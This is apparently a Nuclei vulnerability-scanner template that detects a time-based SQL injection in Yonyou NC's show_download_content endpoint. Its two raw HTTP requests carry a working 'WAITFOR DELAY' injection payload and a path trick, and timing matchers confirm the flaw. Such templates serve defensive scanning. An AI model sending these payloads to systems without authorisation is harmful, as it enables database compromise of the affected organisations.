id: yongyou-nc-show-download-content-sqli
info:
  name: Yonyou NC show_download_content SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: yongyou-nc
  description: |
    SQL Injection vulnerability in Yonyou NC's show_download_content endpoint. Exploitation could lead to database compromise.

http:
  - raw:
      - |
        GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

      - |
        GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Yonyou NC"
        part: body
      - type: word
        words:
          - "/ebvp"
        part: header
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
